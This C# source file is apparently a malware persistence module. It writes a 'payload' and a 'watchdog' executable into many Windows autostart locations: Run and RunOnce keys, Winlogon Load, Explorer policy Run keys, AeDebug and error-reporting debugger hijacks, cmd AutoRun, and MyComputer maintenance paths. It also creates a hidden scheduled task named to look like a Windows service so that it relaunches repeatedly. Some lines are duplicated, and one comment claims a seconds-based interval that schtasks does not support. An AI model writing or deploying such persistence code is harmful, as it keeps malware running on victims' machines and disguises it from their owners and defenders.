using System;
using System.Diagnostics;

namespace Persistence{
    public class Persistence{

        public static void runAllTechniques()
        {
            RegistryHelper.RegistryHelper.SetRegistryKey(@"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\", "RunServicesOnce", Path.Combine(Watchdog.PayloadPath, Watchdog.PayloadName)); // Simple Run Keys
            RegistryHelper.RegistryHelper.SetRegistryKey(@"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\", "RunServicesOnce", Path.Combine(Watchdog.PayloadPath, Watchdog.PayloadName));
            RegistryHelper.RegistryHelper.SetRegistryKey(@"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\", "RunServices", Path.Combine(Watchdog.PayloadPath, Watchdog.PayloadName));
            RegistryHelper.RegistryHelper.SetRegistryKey(@"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\", "RunServices", Path.Combine(Watchdog.PayloadPath, Watchdog.PayloadName));
            RegistryHelper.RegistryHelper.SetRegistryKey(@"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\", "Run", Path.Combine(Watchdog.PayloadPath, Watchdog.PayloadName));
            RegistryHelper.RegistryHelper.SetRegistryKey(@"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\", "RunOnce", Path.Combine(Watchdog.PayloadPath, Watchdog.PayloadName));
            RegistryHelper.RegistryHelper.SetRegistryKey(@"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\", "Run", Path.Combine(Watchdog.PayloadPath, Watchdog.PayloadName));
            RegistryHelper.RegistryHelper.SetRegistryKey(@"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\", "RunOnce", Path.Combine(Watchdog.PayloadPath, Watchdog.PayloadName));
            RegistryHelper.RegistryHelper.SetRegistryKey(@"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Windows", "Load", Path.Combine(Watchdog.PayloadPath, Watchdog.PayloadName));
            RegistryHelper.RegistryHelper.SetRegistryKey(@"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\", "Run", Path.Combine(Watchdog.PrimaryWatchdogPath, Watchdog.PrimaryWatchdogName));
            RegistryHelper.RegistryHelper.SetRegistryKey(@"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\", "Run", Path.Combine(Watchdog.PrimaryWatchdogPath, Watchdog.PrimaryWatchdogName));



            RegistryHelper.RegistryHelper.SetRegistryKey(@"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AeDebug\", "Debugger", Path.Combine(Watchdog.PrimaryWatchdogPath, Watchdog.PrimaryWatchdogName)); //relies on application crash
            RegistryHelper.RegistryHelper.SetRegistryKey(@"HKLM\Software\Microsoft\Windows\Windows Error Reporting\Hangs\", "Debugger", Path.Combine(Watchdog.PrimaryWatchdogPath, Watchdog.PrimaryWatchdogName)); //relies on application crash

            RegistryHelper.RegistryHelper.SetRegistryKey(@"HKEY_CURRENT_USER\Software\Microsoft\Command Processor\", "AutoRun", Path.Combine(Watchdog.PrimaryWatchdogPath, Watchdog.PrimaryWatchdogName)); //Runs when cmd.exe starts


            RegistryHelper.RegistryHelper.SetRegistryKey(@"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\MyComputer", "BackupPath", Path.Combine(Watchdog.PrimaryWatchdogPath, Watchdog.PrimaryWatchdogName)); //These three are Windows background processes
            RegistryHelper.RegistryHelper.SetRegistryKey(@"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\MyComputer", "cleanuppath", Path.Combine(Watchdog.PrimaryWatchdogPath, Watchdog.PrimaryWatchdogName));
            RegistryHelper.RegistryHelper.SetRegistryKey(@"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\MyComputer", "DefragPath", Path.Combine(Watchdog.PrimaryWatchdogPath, Watchdog.PrimaryWatchdogName));


            string taskName = "WindowsDriveVerification";
            string executablePath = Path.Combine(Watchdog.PrimaryWatchdogPath, Watchdog.PrimaryWatchdogName); // Path to the binary you want to run

            // Check if the task exists
            if (!TaskExists(taskName))
            {
                // Create the task if it doesn't exist
                CreateScheduledTask(taskName, executablePath, 30); // Runs every 30 seconds
                Console.WriteLine($"Scheduled task '{taskName}' created successfully.");
            }
            else
            {
                Console.WriteLine($"Scheduled task '{taskName}' already exists.");
            }

        }


        static bool TaskExists(string taskName)
        {
            Process process = new Process();
            process.StartInfo.FileName = "schtasks";
            process.StartInfo.Arguments = $"/Query /TN \"{taskName}\"";
            process.StartInfo.RedirectStandardOutput = true;
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.CreateNoWindow = true;

            process.Start();
            string output = process.StandardOutput.ReadToEnd();
            process.WaitForExit();

            return output.Contains(taskName);
        }

        // Function to create a scheduled task
        static void CreateScheduledTask(string taskName, string binaryPath, int intervalSeconds)
        {
            // Create the schtasks command to run every few seconds
            string command = $"/Create /TN \"{taskName}\" /TR \"{binaryPath}\" /SC ONCE /ST 00:00 /F /RI {intervalSeconds}";

            Process process = new Process();
            process.StartInfo.FileName = "schtasks";
            process.StartInfo.Arguments = command;
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.CreateNoWindow = true;

            process.Start();
            process.WaitForExit();
        }
    }
}